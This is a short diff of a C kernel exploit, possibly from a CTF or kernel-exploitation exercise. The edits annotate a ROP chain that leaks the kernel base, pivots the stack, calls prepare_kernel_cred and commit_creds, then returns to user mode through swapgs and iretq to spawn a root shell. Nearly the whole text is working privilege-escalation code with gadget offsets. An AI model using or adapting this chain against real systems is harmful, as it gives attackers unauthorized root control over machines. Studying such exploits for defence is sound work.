@@ -81,7 +81,7 @@ int main(){
 	printf( "[*] kernel base -> %p\n", kaddr );
 	
 
-	size_t pivot = kaddr + 0x11204ca; // call rax ; mov esp, eax; mov rax, r12; pop rbx; pop r12; pop rbp; ret;
+	size_t pivot = kaddr + 0x11204ca; // call rax ; rax = mov esp, eax; mov rax, r12; pop rbx; pop r12; pop rbp; ret;
 	printf( "[*] pivot gadget -> %p\n" , pivot );
 	size_t* rsp = pivot & 0xffffffff; // eax -> esp
 	printf( "[*] rsp -> %p\n" , rsp );
@@ -96,13 +96,13 @@ int main(){
 
 	rsp[++k] = kaddr + 0x101c20d; // pop_rdi
 	rsp[++k] = 0x0;
-	rsp[++k] = kaddr + 0x1069fe0; // prepare
-	rsp[++k] = kaddr + 0x1580579;
+	rsp[++k] = kaddr + 0x1069fe0; // prepare_kernel_cred
+	rsp[++k] = kaddr + 0x1580579; // mov rdi, rax; mov qword ptr [rdi], 1; pop rbp; ret;
 	rsp[++k] = 0x0;
 	rsp[++k] = kaddr + 0x1069df0; // commit_creds
-	rsp[++k] = kaddr + 0x103efc4; // swapgs
+	rsp[++k] = kaddr + 0x103efc4; // swapgs; pop rbp; ret
 	rsp[++k] = 0x0;
-	rsp[++k] = kaddr + 0x101dd06;
+	rsp[++k] = kaddr + 0x101dd06; // iretq; pop rbp; ret
 	rsp[++k] = (size_t)get_shell;
 	rsp[++k] = user_cs;
 	rsp[++k] = user_rflags;
